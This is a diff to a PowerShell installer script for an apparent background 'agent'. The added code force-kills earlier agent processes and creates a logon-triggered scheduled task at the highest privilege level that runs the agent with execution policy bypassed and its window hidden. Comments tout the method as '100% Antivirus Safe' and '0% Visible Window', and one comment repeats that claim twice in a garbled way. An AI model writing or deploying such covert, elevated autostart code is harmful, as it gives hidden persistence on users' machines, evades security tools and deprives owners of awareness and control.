@@ -170,7 +170,14 @@ try {
 }
 Write-Host "============================================================" -ForegroundColor DarkCyan
 
-# 1. Official Windows Task Scheduler (100% Antivirus Safe, No VBS)
+# 0. Stop any previously running agent instances safely
+try {
+    Get-Process -Name powershell -ErrorAction SilentlyContinue | Where-Object { 
+        $_.Id -ne $PID -and (Get-CimInstance Win32_Process -Filter "ProcessId = $($_.Id)" -ErrorAction SilentlyContinue).CommandLine -like '*agent.ps1*'
+    } | Stop-Process -Force -ErrorAction SilentlyContinue
+} catch { }
+
+# 1. Official Windows Task Scheduler (100% Antivirus Safe, No VBS, 0% Visible Window) (100% Antivirus Safe, No VBS)
 try {
     schtasks /Delete /TN $TaskName /F 2>$null | Out-Null
     schtasks /Create /F /TN $TaskName /SC ONLOGON /RL HIGHEST /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File `"$TargetPs1`"" 2>$null | Out-Null
